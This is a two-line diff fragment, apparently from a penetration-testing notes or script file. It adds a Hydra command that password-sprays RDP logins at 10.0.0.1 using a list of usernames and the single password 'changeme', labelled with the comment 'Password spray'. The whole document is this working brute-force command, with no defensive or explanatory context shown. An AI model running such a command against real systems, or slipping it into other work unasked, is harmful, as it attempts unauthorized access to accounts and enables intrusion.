@@ -1,0 +1,2 @@
+hydra -L names.txt -p "changeme" rdp://10.0.0.1
+# Password spray
